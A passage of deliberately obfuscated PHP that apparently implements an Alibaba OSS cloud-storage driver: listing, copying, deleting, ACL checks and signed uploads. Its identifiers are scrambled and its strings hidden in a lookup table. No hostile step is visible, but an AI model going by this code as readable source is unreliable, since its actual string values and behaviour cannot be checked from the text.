$şŠşú¾->getRules())) { return null; } $÷ŠÒœ³Ÿ = $Ûœé¾“Í[0]->getAllowedOrigins(); $«Å©ºˆÂ = $Ûœé¾“Í[0]->getAllowedMethods(); $‘ÌÔå©Î = $Ûœé¾“Í[0]->getMaxAgeSeconds(); $ğ ìîÇó = $Ûœé¾“Í[0]->getExposeHeaders(); $ç¢íî° = $Ûœé¾“Í[0]->getAllowedHeaders(); return array($ìÌ¿ÛÔ¯[221] => isset($÷ŠÒœ³Ÿ[0]) ? $÷ŠÒœ³Ÿ[0] : $ìÌ¿ÛÔ¯[12], $ìÌ¿ÛÔ¯[225] => $«Å©ºˆÂ, $ìÌ¿ÛÔ¯[1507] => $‘ÌÔå©Î, $ìÌ¿ÛÔ¯[1508] => isset($ğ ìîÇó[0]) ? $ğ ìîÇó[0] : $ìÌ¿ÛÔ¯[12], $ìÌ¿ÛÔ¯[222] => isset($ç¢íî°[0]) ? $ç¢íî°[0] : $ìÌ¿ÛÔ¯[12]); } public function isBucketCors() { $ı˜Ä²İ =& $_SERVER[ÓïÕü]; $ß”±ş = $this->getBucketCors(); if (!$ß”±ş || !is_array($ß”±ş)) { return !1; } if ($ß”±ş[$ı˜Ä²İ[221]] != $ı˜Ä²İ[223] || $ß”±ş[$ı˜Ä²İ[222]] != $ı˜Ä²İ[223]) { return !1; } $ã„¸³á˜ = array_map($ı˜Ä²İ[224], $ß”±ş[$ı˜Ä²İ[225]]); if (!is_array($ã„¸³á˜)) { $ã„¸³á˜ = array(); } $Ò÷ˆ„ëª = array($ı˜Ä²İ[226], $ı˜Ä²İ[227], $ı˜Ä²İ[228], $ı˜Ä²İ[229], $ı˜Ä²İ[230]); $ÅÜé¯‹Ù = array_diff($Ò÷ˆ„ëª, $ã„¸³á˜); return empty($ÅÜé¯‹Ù); } public function mkfile($İ¸›ÕÄå, $–¯×ŸÑü = '', $±²´šà = REPEAT_RENAME) { $ïç¦—İÜ = $this->setContent($İ¸›ÕÄå, $–¯×ŸÑü); if ($ïç¦—İÜ !== !1) { return $this->getPathOuter($İ¸›ÕÄå); } return !1; } public function mkdir($ı¥ìâ²è, $Ê¨„à” = REPEAT_SKIP) { if ($Ê¨„à” && $this->_isFolder($ı¥ìâ²è)) { return $this->getPathOuter($ı¥ìâ²è); } try { $this->client->createObjectDir($this->bucket, $this->pathEncode($ı¥ìâ²è)); } catch (OSS\Core\OssException $ÆûáÕõŸ) { $this->writeLog(__FUNCTION__ . $_SERVER[ÓïÕü][215] . $ÆûáÕõŸ->getMessage()); return !1; } return $this->getPathOuter($ı¥ìâ²è); } private function fileList($êÜ Í, $¼Ü¤ŸÂÉ = '', $¤Ë÷Ë¹ = 0) { $áÔªğ²ò =& $_SERVER[ÓïÕü]; $êÜ Í = trim($êÜ Í, $áÔªğ²ò[8]); $êÉ²µé = empty($êÜ Í) && $êÜ Í !== $áÔªğ²ò[231] ? $áÔªğ²ò[12] : $êÜ Í . $áÔªğ²ò[8]; $¯ü°ñàÈ = $áÔªğ²ò[12]; $¶ÙıéÅ× = 1000; $Ï÷ğ» = $Ğ Š½™¦ = array(); while (!0) { check_abort(); $äˆºãù = array($áÔªğ²ò[1509] => $¼Ü¤ŸÂÉ, $áÔªğ²ò[1510] => $êÉ²µé, $áÔªğ²ò[1511] => $¶ÙıéÅ×, $áÔªğ²ò[1512] => $¯ü°ñàÈ); try { $è±šû™ = $this->client->listObjects($this->bucket, $äˆºãù); } catch (OSS\Core\OssException $óë•Íàš) { $this->writeLog(__FUNCTION__ . $áÔªğ²ò[215] . $óë•Íàš->getMessage()); break; } $¯ü°ñàÈ = $è±šû™->getNextMarker(); $Ö³¼¡í® = $è±šû™->getObjectList(); $í ¡ìÖ´ = $è±šû™->getPrefixList(); foreach ($Ö³¼¡í® as $‚şö˜‡á) { if ($‚şö˜‡á->getKey() == $êÉ²µé) { continue; } $ëìÏùİØ = $‚şö˜‡á->getKey(); $Çç¹çß­ = $‚şö˜‡á->getSize(); $”‘ñãñÀ = $‚şö˜‡á->getLastModified(); $²Í³ö¬€ = trim($‚şö˜‡á->getETag(), $áÔªğ²ò[121]); $à’šÛ›õ = $¤Ë÷Ë¹ ? array($áÔªğ²ò[32] => $ëìÏùİØ, $áÔªğ²ò[79] => $Çç¹çß­, $áÔªğ²ò[207] => strtotime($”‘ñãñÀ), $áÔªğ²ò[1513] => $²Í³ö¬€) : $ëìÏùİØ; $•ıÔÇ™¶ = $Çç¹çß­ == 0 && substr($ëìÏùİØ, strlen($ëìÏùİØ) - 1, 1) == $áÔªğ²ò[8] ? !0 : !1; $¦·ğµÒ = array($áÔªğ²ò[79] => $Çç¹çß­, $áÔªğ²ò[1514] => $Çç¹çß­, $áÔªğ²ò[88] => strtotime($”‘ñãñÀ), $áÔªğ²ò[1515] => $”‘ñãñÀ, $áÔªğ²ò[1513] => $²Í³ö¬€); $this->cacheMethodInfoSet($ëìÏùİØ, $•ıÔÇ™¶, $¦·ğµÒ); if ($•ıÔÇ™¶) { $Ï÷ğ»[] = $ëìÏùİØ; continue; } $Ğ Š½™¦[] = $à’šÛ›õ; } foreach ($í ¡ìÖ´ as $Îû‚ôÇ) { $Ï÷ğ»[] = $Îû‚ôÇ->getPrefix(); $this->cacheMethodInfoSet($Îû‚ôÇ->getPrefix(), !0); } if ($¯ü°ñàÈ === $áÔªğ²ò[12]) { break; } } $this->cacheMethodInfoSet($êÜ Í, !0); return array($áÔªğ²ò[85] => $Ï÷ğ», $áÔªğ²ò[86] => $Ğ Š½™¦); } public function listObject($µ¾¤ªîÙ, $”×¸ì¢ï = '') { $İõöÏ”ó =& $_SERVER[ÓïÕü]; $µ¾¤ªîÙ = trim($µ¾¤ªîÙ, $İõöÏ”ó[8]); $–ì©— = empty($µ¾¤ªîÙ) && $µ¾¤ªîÙ !== $İõöÏ”ó[231] ? $İõöÏ”ó[12] : $µ¾¤ªîÙ . $İõöÏ”ó[8]; $×¹´Ó£ë = $İõöÏ”ó[12]; $áŞ©Ÿ»“ = 1000; $´Èå‹™´ = $²Á„€º„ = array(); while (!0) { check_abort(); $óìºå½ = array($İõöÏ”ó[1509] => $”×¸ì¢ï, $İõöÏ”ó[1510] => $–ì©—, $İõöÏ”ó[1511] => $áŞ©Ÿ»“, $İõöÏ”ó[1512] => $×¹´Ó£ë); try { $ó¢¬–éü = $this->client->listObjects($this->bucket, $óìºå½); } catch (OSS\Core\OssException $œìÌ˜—¹) { $this->writeLog(__FUNCTION__ . $İõöÏ”ó[215] . $œìÌ˜—¹->getMessage()); break; } $×¹´Ó£ë = $ó¢¬–éü->getNextMarker(); $Ô‰¶°Ñ = $ó¢¬–éü->getObjectList(); foreach ($Ô‰¶°Ñ as $±ÆŸ‚ë) { if ($±ÆŸ‚ë->getKey() == $–ì©—) { continue; } $¼åˆÒœª = $±ÆŸ‚ë->getKey(); $úîğÄ›× = $±ÆŸ‚ë->getSize(); $³Á¢ Ÿ = $úîğÄ›× == 0 && substr($¼åˆÒœª, strlen($¼åˆÒœª) - 1, 1) == $İõöÏ”ó[8] ? !0 : !1; if ($³Á¢ Ÿ) { continue; } $²Á„€º„[] = $úîğÄ›× . $İõöÏ”ó[215] . $¼åˆÒœª; } if ($×¹´Ó£ë === $İõöÏ”ó[12]) { break; } } return array($İõöÏ”ó[85] => $´Èå‹™´, $İõöÏ”ó[86] => $²Á„€º„); } public function copyFile($ğªù¸Ú, $×’ËÒÜ) { $‚ÊÕ®¿Ó = $this->size($ğªù¸Ú); if ($‚ÊÕ®¿Ó < 1024 * 1024 * 1024) { try { $this->client->copyObject($this->bucket, $ğªù¸Ú, $this->bucket, $this->pathEncode($×’ËÒÜ)); } catch (OSS\Core\OssException $»§”åâ) { $this->writeLog(__FUNCTION__ . $_SERVER[ÓïÕü][215] . $»§”åâ->getMessage()); return !1; } return $this->getPathOuter($×’ËÒÜ); } $çµÕúò = $this->multiCopyObject($ğªù¸Ú, $×’ËÒÜ, $‚ÊÕ®¿Ó); return $çµÕúò ? $this->getPathOuter($×’ËÒÜ) : !1; } private function multiCopyObject($¯ª¨, $Ñ ÜüŠ, $ÃÂà¯) { $ñÁÆö«É =& $_SERVER[ÓïÕü]; try { $ÒëêŒ²ñ = array(); if ($ÌııîÔæ = $this->hashMd5($¯ª¨)) { $ÒëêŒ²ñ = array(OSS\OssClient::OSS_HEADERS => array($ñÁÆö«É[1516] => $ÌııîÔæ)); } $Êİá¿ò = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($Ñ ÜüŠ), $ÒëêŒ²ñ); $¸Û¾‰™Ş = 1; $ÏÔ®—í = 0; $Ñ«à¾õæ = array(); $›±ô « = 1024 * 1024 * 10; $±Àø¯»Î = $this->client->generateMultiuploadParts($ÃÂà¯, $›±ô «); foreach ($±Àø¯»Î as $ÌÚ¦ôş => $ó‡éŞ·) { $·—¶£É = $ÏÔ®—í + (int) $ó‡éŞ·[$ñÁÆö«É[1517]]; $¯’ôœ½İ = (int) $ó‡éŞ·[$ñÁÆö«É[415]] + $·—¶£É - 1; $©µËÌ¶· = array($ñÁÆö«É[167] => $·—¶£É, $ñÁÆö«É[168] => $¯’ôœ½İ); $Ñ«à¾õæ[] = $this->client->uploadPartCopy($this->bucket, $¯ª¨, $this->bucket, $this->pathEncode($Ñ ÜüŠ), $¸Û¾‰™Ş, $Êİá¿ò, $©µËÌ¶·); $¸Û¾‰™Ş = $¸Û¾‰™Ş + 1; } $ñÎ»°±ş = array(); foreach ($Ñ«à¾õæ as $ÌÚ¦ôş => $Ÿ‡–©ñü) { $ñÎ»°±ş[] = array($ñÁÆö«É[300] => $ÌÚ¦ôş + 1, $ñÁÆö«É[301] => $Ÿ‡–©ñü); } $this->client->completeMultipartUpload($this->bucket, $this->pathEncode($Ñ ÜüŠ), $Êİá¿ò, $ñÎ»°±ş); } catch (OSS\Core\OssException $Ö×ïë) { $this->writeLog(__FUNCTION__ . $ñÁÆö«É[215] . $Ö×ïë->getMessage()); return !1; } return !0; } public function moveFile($ş½áŞ„», $ØˆÅ¾ÇÅ) { if ($this->copyFile($ş½áŞ„», $ØˆÅ¾ÇÅ)) { $this->remove($ş½áŞ„»); return $this->getPathOuter($ØˆÅ¾ÇÅ); } return !1; } public function delFile($ßÄ­äòÃ) { try { $this->client->deleteObject($this->bucket, $this->pathEncode($ßÄ­äòÃ)); } catch (OSS\Core\OssException $Şø°Šş§) { $this->writeLog(__FUNCTION__ . $_SERVER[ÓïÕü][215] . $Şø°Šş§->getMessage()); return !1; } return !0; } public function delFolder($‘Œ‡ÙÈê) { $ Ìó£“ê =& $_SERVER[ÓïÕü]; if (!$this->exist($‘Œ‡ÙÈê)) { return !0; } $this->listItemCache = !1; $œÎ®«Ğ© = $this->fileList($‘Œ‡ÙÈê); $this->listItemCache = !0; $í»¥Ä¡ = trim($‘Œ‡ÙÈê, $ Ìó£“ê[8]) . $ Ìó£“ê[8]; if (!empty($‘Œ‡ÙÈê) && $‘Œ‡ÙÈê !== $ Ìó£“ê[231] && !in_array($í»¥Ä¡, $œÎ®«Ğ©[$ Ìó£“ê[85]])) { $œÎ®«Ğ©[$ Ìó£“ê[85]][] = $í»¥Ä¡; } $ìà¦‰í¶ = $this->delByBatch($œÎ®«Ğ©[$ Ìó£“ê[86]]); if (!$ìà¦‰í¶) { return !1; } $ìà¦‰í¶ = $this->delByBatch($œÎ®«Ğ©[$ Ìó£“ê[85]]); if (!$ìà¦‰í¶) { return !1; } return $this->delFile($í»¥Ä¡); } private function delByBatch($è“©â¢®) { foreach (array_chunk($è“©â¢®, 1000) as $·¦ëıñè) { try { $this->client->deleteObjects($this->bucket, $·¦ëıñè); } catch (OSS\Core\OssException $ìÎ½’õ×) { $this->writeLog(__FUNCTION__ . $_SERVER[ÓïÕü][215] . $ìÎ½’õ×->getMessage()); return !1; } } return !0; } public function rename($éÈ’æ÷Õ, $ƒùÄ£Ğ ) { return $this->renameObject($éÈ’æ÷Õ, $ƒùÄ£Ğ ); } private function fileInfo($‹İõ¤ºŠ, $ÆªÅƒ’… = false, $¤”ÓÃ‡ø = array()) { $òæÒŒ§´ =& $_SERVER[ÓïÕü]; $µÅ¿Ø’ = array($òæÒŒ§´[32] => $this->pathThis($‹İõ¤ºŠ), $òæÒŒ§´[87] => $this->getPathOuter($‹İõ¤ºŠ), $òæÒŒ§´[33] => $òæÒŒ§´[233], $òæÒŒ§´[79] => isset($¤”ÓÃ‡ø[$òæÒŒ§´[79]]) ? $¤”ÓÃ‡ø[$òæÒŒ§´[79]] : 0, $òæÒŒ§´[169] => $this->ext($‹İõ¤ºŠ)); if ($ÆªÅƒ’…) { return $µÅ¿Ø’; } $µÅ¿Ø’[$òæÒŒ§´[234]] = $µÅ¿Ø’[$òæÒŒ§´[88]] = 0; $µÅ¿Ø’[$òæÒŒ§´[235]] = $µÅ¿Ø’[$òæÒŒ§´[236]] = !0; if (empty($¤”ÓÃ‡ø)) { $ìë«ö‹ï = $this->objectMeta($‹İõ¤ºŠ); if (!$ìë«ö‹ï) { return $µÅ¿Ø’; } $¤”ÓÃ‡ø = array($òæÒŒ§´[88] => strtotime($ìë«ö‹ï[$òæÒŒ§´[1515]]), $òæÒŒ§´[79] => $ìë«ö‹ï[$òæÒŒ§´[1514]] + 0, $òæÒŒ§´[1513] => $ìë«ö‹ï[$òæÒŒ§´[1513]]); } if (isset($¤”ÓÃ‡ø[$òæÒŒ§´[1513]]) && $¤”ÓÃ‡ø[$òæÒŒ§´[1513]]) { $µÅ¿Ø’[$òæÒŒ§´[238]] = trim($¤”ÓÃ‡ø[$òæÒŒ§´[1513]], $òæÒŒ§´[121]); } if (isset($¤”ÓÃ‡ø[$òæÒŒ§´[79]])) { $µÅ¿Ø’[$òæÒŒ§´[79]] = $¤”ÓÃ‡ø[$òæÒŒ§´[79]]; } if (isset($¤”ÓÃ‡ø[$òæÒŒ§´[88]])) { $µÅ¿Ø’[$òæÒŒ§´[88]] = $¤”ÓÃ‡ø[$òæÒŒ§´[88]]; } if (isset($¤”ÓÃ‡ø[$òæÒŒ§´[207]]) && !trim($µÅ¿Ø’[$òæÒŒ§´[88]])) { $µÅ¿Ø’[$òæÒŒ§´[88]] = $¤”ÓÃ‡ø[$òæÒŒ§´[207]]; } return $µÅ¿Ø’; } private function folderInfo($§¡™ØÒÅ, $¹äˆù³ª = false, $‡–À³ÛÎ = array()) { $å…°ÌŠÊ =& $_SERVER[ÓïÕü]; $ €ÖÀö = array($å…°ÌŠÊ[32] => $this->pathThis($§¡™ØÒÅ), $å…°ÌŠÊ[87] => $this->getPathOuter($å…°ÌŠÊ[8] . $§¡™ØÒÅ), $å…°ÌŠÊ[33] => $å…°ÌŠÊ[78]); if ($¹äˆù³ª) { return $ €ÖÀö; } $ €ÖÀö[$å…°ÌŠÊ[234]] = $ €ÖÀö[$å…°ÌŠÊ[88]] = 0; $ €ÖÀö[$å…°ÌŠÊ[235]] = $ €ÖÀö[$å…°ÌŠÊ[236]] = !0; if (empty($‡–À³ÛÎ)) { $§¡™ØÒÅ = rtrim($§¡™ØÒÅ, $å…°ÌŠÊ[8]) . $å…°ÌŠÊ[8]; $±»ÎÂû = $this->objectMeta($§¡™ØÒÅ); if (!$±»ÎÂû) { return $ €ÖÀö; } $‡–À³ÛÎ = array($å…°ÌŠÊ[234] => $±»ÎÂû[$å…°ÌŠÊ[580]][$å…°ÌŠÊ[1518]], $å…°ÌŠÊ[88] => strtotime($±»ÎÂû[$å…°ÌŠÊ[1515]])); } if (isset($‡–À³ÛÎ[$å…°ÌŠÊ[88]])) { $ €ÖÀö[$å…°ÌŠÊ[88]] = $‡–À³ÛÎ[$å…°ÌŠÊ[88]]; } if (isset($‡–À³ÛÎ[$å…°ÌŠÊ[234]])) { $ €ÖÀö[$å…°ÌŠÊ[234]] = $‡–À³ÛÎ[$å…°ÌŠÊ[234]]; } return $ €ÖÀö; } public function listPath($ß¤Î°é„, $éÍ¨†ºÏ = false) { $¹á°åÅÊ =& $_SERVER[ÓïÕü]; $ÍƒŠıáŸ = $this->fileList($ß¤Î°é„, $¹á°åÅÊ[8], !0); foreach ($ÍƒŠıáŸ[$¹á°åÅÊ[85]] as $âı””¯Ç => $¤¶ôåÑµ) { $ÍƒŠıáŸ[$¹á°åÅÊ[85]][$âı””¯Ç] = $this->folderInfo($¤¶ôåÑµ, $éÍ¨†ºÏ, $¤¶ôåÑµ); } foreach ($ÍƒŠıáŸ[$¹á°åÅÊ[86]] as $âı””¯Ç => $¤¶ôåÑµ) { $ÍƒŠıáŸ[$¹á°åÅÊ[86]][$âı””¯Ç] = $this->fileInfo($¤¶ôåÑµ[$¹á°åÅÊ[32]], $éÍ¨†ºÏ, $¤¶ôåÑµ); } return $ÍƒŠıáŸ; } protected function infoChildren($¾©ªËÂ§, &$é…îÕÅ) { $îúË™İŒ =& $_SERVER[ÓïÕü]; $ßÌèÒÙÌ = $this->fileList($¾©ªËÂ§, $îúË™İŒ[12], !0); $é…îÕÅ[$îúË™İŒ[81]] += count($ßÌèÒÙÌ[$îúË™İŒ[85]]); $é…îÕÅ[$îúË™İŒ[80]] += count($ßÌèÒÙÌ[$îúË™İŒ[86]]); foreach ($ßÌèÒÙÌ[$îúË™İŒ[86]] as $ò–şİ ) { if (!$ò–şİ  || !$ò–şİ [$îúË™İŒ[79]]) { continue; } $é…îÕÅ[$îúË™İŒ[79]] += $ò–şİ [$îúË™İŒ[79]]; } } public function has($˜†ş¿Ÿß, $şë‘»½¯ = false, $ÎŠÁ–Û = true) { $×Ÿ¤¥¾Ñ =& $_SERVER[ÓïÕü]; $˜†ş¿Ÿß = trim($˜†ş¿Ÿß, $×Ÿ¤¥¾Ñ[8]); $¶Èô¢œŸ = empty($˜†ş¿Ÿß) && $˜†ş¿Ÿß !== $×Ÿ¤¥¾Ñ[231] ? $×Ÿ¤¥¾Ñ[12] : $˜†ş¿Ÿß . $×Ÿ¤¥¾Ñ[8]; $öÃ‡¢•É = $×Ÿ¤¥¾Ñ[12]; $±ººÅí´ = 500; $İ§™¥ÉÚ = $ôõ‡™üÈ = 0; while (!0) { check_abort(); $´¦ é” = array($×Ÿ¤¥¾Ñ[1509] => $×Ÿ¤¥¾Ñ[8], $×Ÿ¤¥¾Ñ[1510] => $¶Èô¢œŸ, $×Ÿ¤¥¾Ñ[1511] => $±ººÅí´, $×Ÿ¤¥¾Ñ[1512] => $öÃ‡¢•É); try { $¶š…ïâÍ = $this->client->listObjects($this->bucket, $´¦ é”); } catch (OSS\Core\OssException $ÚèğŒòª) { $this->writeLog(__FUNCTION__ . $×Ÿ¤¥¾Ñ[215] . $ÚèğŒòª->getMessage()); break; } $öÃ‡¢•É = $¶š…ïâÍ->getNextMarker(); $ÆÖÊ³„™ = $¶š…ïâÍ->getObjectList(); $£»•Ì²ø = $¶š…ïâÍ->getPrefixList(); if ($şë‘»½¯) { if (count($ÆÖÊ³„™) > 1 || count($ÆÖÊ³„™) == 1 && $ÆÖÊ³„™[0]->getKey() != $¶Èô¢œŸ) { $İ§™¥ÉÚ += count($ÆÖÊ³„™) - 1; } if (!empty($£»•Ì²ø)) { $ôõ‡™üÈ += count($£»•Ì²ø); } if ($öÃ‡¢•É === $×Ÿ¤¥¾Ñ[12]) { break; } continue; } if ($ÎŠÁ–Û) { if (!empty($ÆÖÊ³„™)) { if (count($ÆÖÊ³„™) > 1 || $ÆÖÊ³„™[0]->getKey() != $¶Èô¢œŸ) { return !0; } } } else { if (!empty($£»•Ì²ø)) { return !0; } } if ($öÃ‡¢•É === $×Ÿ¤¥¾Ñ[12]) { break; } } if ($şë‘»½¯) { return array($×Ÿ¤¥¾Ñ[242] => $İ§™¥ÉÚ, $×Ÿ¤¥¾Ñ[243] => $ôõ‡™üÈ); } return !1; } public function listAll($ö¤Ìª”) { $–Ø ôûş =& $_SERVER[ÓïÕü]; $î„¹ÖÚë = $this->fileList($ö¤Ìª”, $–Ø ôûş[12], !0); $­‚›°‡ç = array_to_keyvalue($î„¹ÖÚë[$–Ø ôûş[86]], $–Ø ôûş[32]); foreach ($î„¹ÖÚë[$–Ø ôûş[85]] as $†ïı½ú) { if (is_string($†ïı½ú)) { $­‚›°‡ç[$†ïı½ú] = array($–Ø ôûş[79] => 0); } } return $this->listAllFiles($ö¤Ìª”, $­‚›°‡ç); } public function canRead($€õëæÇÆ) { $¡¬³É =& $_SERVER[ÓïÕü]; $—¾‰‘¦ß = $this->pathAcl($€õëæÇÆ); return $—¾‰‘¦ß == $¡¬³É[1519] || $—¾‰‘¦ß == $¡¬³É[627] ? !0 : !1; } public function canWrite($Àô†ôÊö) { $›ô˜¾â = $this->pathAcl($Àô†ôÊö); return $›ô˜¾â == $_SERVER[ÓïÕü][627] ? !0 : !1; } public function pathAcl($½¹·ËöÖ) { $Îö³İÛ® =& $_SERVER[ÓïÕü]; if (empty($this->bucketAcl)) { $this->bucketAcl = $this->client->getBucketAcl($this->bucket); } try { $À˜ØıÇü = $this->client->getObjectAcl($this->bucket, $this->pathEncode($½¹·ËöÖ)); } catch (OSS\Core\OssException $ÕñÅ–°) { $this->writeLog(__FUNCTION__ . $Îö³İÛ®[215] . $ÕñÅ–°->getMessage()); return !1; } $®ï¸Û°“ = $À˜ØıÇü == $Îö³İÛ®[37] ? $this->bucketAcl : $À˜ØıÇü; if ($®ï¸Û°“ == $Îö³İÛ®[1520]) { return $Îö³İÛ®[1519]; } if ($®ï¸Û°“ == $Îö³İÛ®[1521]) { return $Îö³İÛ®[627]; } return $®ï¸Û°“; } private function chmodPath($Å İ£ó, $¥¤é¨¢í = '') { $öƒè™²¨ =& $_SERVER[ÓïÕü]; $±ö†‚Šî = empty($¥¤é¨¢í) ? $öƒè™²¨[1521] : $¥¤é¨¢í; $ÎöŒÒë« = array($öƒè™²¨[37], $öƒè™²¨[232], $öƒè™²¨[1520], $öƒè™²¨[1521]); if (!in_array($±ö†‚Šî, $ÎöŒÒë«)) { return !1; } try { $this->client->putObjectAcl($this->bucket, $this->pathEncode($Å İ£ó), $±ö†‚Šî); } catch (OSS\Core\OssException $²¤ú‰È³) { $this->writeLog(__FUNCTION__ . $öƒè™²¨[215] . $²¤ú‰È³->getMessage()); return !1; } return !0; } public function getContent($¡û‡»§Ò) { return $this->fileSubstr($¡û‡»§Ò, -1); } public function setContent($³ùÂĞ‡ò, $Ş¤»ºÌ = '') { $ğˆîÍ¨ß =& $_SERVER[ÓïÕü]; try { $£…ª¡Õ• = $this->trafficLimit($ğˆîÍ¨ß[1522]); $¡¾¬ã›» = $this->client->putObject($this->bucket, $this->pathEncode($³ùÂĞ‡ò), $Ş¤»ºÌ, $£…ª¡Õ•); } catch (OSS\Core\OssException $ÌÆ½áÛº) { $this->writeLog(__FUNCTION__ . $ğˆîÍ¨ß[215] . $ÌÆ½áÛº->getMessage()); return !1; } $ÓşşÑ¿Ó = array($ğˆîÍ¨ß[1516] => trim($¡¾¬ã›»[$ğˆîÍ¨ß[1513]], $ğˆîÍ¨ß[121]), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($³ùÂĞ‡ò))); $this->updateObjMeta($³ùÂĞ‡ò, $ÓşşÑ¿Ó); return isset($¡¾¬ã›»[$ğˆîÍ¨ß[1523]][$ğˆîÍ¨ß[297]]) ? !0 : !1; } private function updateObjMeta($œëš¾‰ò, $ğøœŞƒ) { $œëš¾‰ò = $this->pathEncode($œëš¾‰ò); try { $Ğá¹èÖ® = array(OSS\OssClient::OSS_HEADERS => $ğøœŞƒ); $this->client->copyObject($this->bucket, $œëš¾‰ò, $this->bucket, $œëš¾‰ò, $Ğá¹èÖ®); } catch (OSS\Core\OssException $àşĞé‘³) { $this->writeLog(__FUNCTION__ . $_SERVER[ÓïÕü][215] . $àşĞé‘³->getMessage()); return !1; } return !0; } public function upload($ÀŒáá®», $ß”ö¨äÊ, $‹ì›Æ¥È = false, $Ÿ”ú·á¡ = REPEAT_REPLACE) { $²¬Á«ö  =& $_SERVER[ÓïÕü]; $ùã¨ æ³ = trim($ÀŒáá®», $²¬Á«ö [8]); $‡µ±©óâ = array(OSS\OssClient::OSS_CHECK_MD5 => !0, OSS\OssClient::OSS_PART_SIZE => 1024 * 1024 * 10, OSS\OssClient::OSS_HEADERS => array($²¬Á«ö [1516] => @md5_file($ß”ö¨äÊ)), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($ÀŒáá®»))); $‡µ±©óâ = $this->trafficLimit($²¬Á«ö [1522], $‡µ±©óâ); try { $this->client->multiuploadFile($this->bucket, $this->pathEncode($ùã¨ æ³), $ß”ö¨äÊ, $‡µ±©óâ); } catch (OSS\Core\OssException $Ä•÷¨ÅÚ) { $this->writeLog(__FUNCTION__ . $²¬Á«ö [215] . $Ä•÷¨ÅÚ->getMessage()); return !1; } return $this->getPathOuter($ÀŒáá®»); } public function getHost() { $ü™Àç‰ =& $_SERVER[ÓïÕü]; $ÓÍíŞ· = explode($ü™Àç‰[211], parent::getHost()); return $ÓÍíŞ·[0] . $ü™Àç‰[211] . $this->bucket . $ü™Àç‰[10] . $ÓÍíŞ·[1]; } public function uploadFormData($èÙšÆìë, $¢÷ñäÕ = 3600) { $æš±¿® =& $_SERVER[ÓïÕü]; if (!($¶ÀÜ”‘Û = $this->getHost())) { return !1; } $êÔåëØ = $¢÷ñäÕ; $µÀ¶˜È = date($æš±¿®[1524], time() + $êÔåëØ); $ç‘„²Ğ˜ = new DateTime($µÀ¶˜È); $èÁå¡“„ = $ç‘„²Ğ˜->format(DateTime::ISO8601); $¸é“Òöé = strpos($èÁå¡“„, $æš±¿®[374]); $èÁå¡“„ = substr($èÁå¡“„, 0, $¸é“Òöé) . $æš±¿®[1525]; $˜áêÎ÷ = 1048576000 * 5; $“Ù—¡üÌ = $this->pathFather($èÙšÆìë); $íĞÕå”” = array($æš±¿®[265] => $èÁå¡“„, $æš±¿®[268] => array(array($æš±¿®[1526], 0, $˜áêÎ÷), array($æš±¿®[270], $æš±¿®[271], $“Ù—¡üÌ))); $£Š²ğÀò = base64_encode(json_encode($íĞÕå””)); $µÊ•¹ÆÄ = base64_encode(hash_hmac($æš±¿®[1447], $£Š²ğÀò, $this->secret, !0)); $òÑß²‹ = array($æš±¿®[1527] => $this->accessKey, $æš±¿®[280] => $£Š²ğÀò, $æš±¿®[273] => $æš±¿®[264], $æš±¿®[1528] => $µÊ•¹ÆÄ, $æš±¿®[209] => $¶ÀÜ”‘Û); $òÑß²‹ = $this->trafficLimit($æš±¿®[1522], $òÑß²‹, !0); return $òÑß²‹; } public function uploadMultiData($•÷¼Ù±Ö, $…øƒ—óÏ = 3600) { $¹Âåí¥ß =& $_SERVER[ÓïÕü]; if (!($ÛíÆ™æ« = $this->getHost())) { return !1; } $„£¨£½ó = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($•÷¼Ù±Ö)); return array($¹Âåí¥ß[284] => $„£¨£½ó, $¹Âåí¥ß[209] => $ÛíÆ™æ« . $¹Âåí¥ß[8] . $this->pathEncode($•÷¼Ù±Ö), $¹Âåí¥ß[285] => gmdate($¹Âåí¥ß[1529]), $¹Âåí¥ß[97] => $•÷¼Ù±Ö); } public function uploadMultiAuth($½°óê¬, $¡İêò» = array()) { if (isset($¡İêò»[$_SERVER[ÓïÕü][286]])) { return $this->uploadPartAuth($½°óê¬, $¡İêò»); } return $this->uploadListAuth($½°óê¬, $¡İêò»); } private function uploadPartAuth($Èù‡Ú³¦, $ö´×óÁ¥ = array()) { $ÄŞĞÛ¸˜ =& $_SERVER[ÓïÕü]; $ãš×¿ò¡ = $ö´×óÁ¥[$ÄŞĞÛ¸˜[97]]; $»‘÷ıâ¿ = $this->_getUploadAuth($ãš×¿ò¡, $ö´×óÁ¥); $…£¼à¼ = array($ÄŞĞÛ¸˜[289] => $»‘÷ıâ¿[$ÄŞĞÛ¸˜[289]], $ÄŞĞÛ¸˜[285] => $»‘÷ıâ¿[$ÄŞĞÛ¸˜[285]]); if (isset($»‘÷ıâ¿[$ÄŞĞÛ¸˜[1530]])) { $…£¼à¼[$ÄŞĞÛ¸˜[1530]] = $»‘÷ıâ¿[$ÄŞĞÛ¸˜[1530]]; } return $…£¼à¼; } private function uploadListAuth($’¤Ší§Ó, $ÍÆ¶´Â = array()) { $—Ñ§š˜ =& $_SERVER[ÓïÕü]; $áßšù† = $ÍÆ¶´Â[$—Ñ§š˜[97]]; $¶âÏã“È = $ÍÆ¶´Â[$—Ñ§š˜[284]]; $ØÖÚ–äˆ = $this->client->listParts($this->bucket, $this->pathEncode($áßšù†), $¶âÏã“È); $Æë¥¶½§ = $ØÖÚ–äˆ->getListPart(); $ˆè³­ÊÃ = array(); foreach ($Æë¥¶½§ as $Ïı†è–¿) { $ˆè³­ÊÃ[] = array($—Ñ§š˜[300] => $Ïı†è–¿->getPartNumber(), $—Ñ§š˜[301] => trim($Ïı†è–¿->getETag(), $—Ñ§š˜[121])); } if (!$ˆè³­ÊÃ) { return !1; } $ÛÅÎ„¶İ = $this->_getUploadAuth($áßšù†, $ÍÆ¶´Â); return array($—Ñ§š˜[289] => $ÛÅÎ„¶İ[$—Ñ§š˜[289]], $—Ñ§š˜[285] => $ÛÅÎ„¶İ[$—Ñ§š˜[285]], $—Ñ§š˜[292] => $ˆè³­ÊÃ); } private function _getUploadAuth($õáŞ”£, $Ô€ù²òÃ) { $‚·ÖÖø¼ =& $_SERVER[ÓïÕü]; $Ÿ®®†à‹ = gmdate($‚·ÖÖø¼[1529]); $ö¡ñŞöô = isset($Ô€ù²òÃ[$‚·ÖÖø¼[286]]) ? $‚·ÖÖø¼[256] : $‚·ÖÖø¼[291]; $‰À™ç¿ = array_intersect_key($Ô€ù²òÃ, array_flip(array($‚·ÖÖø¼[286], 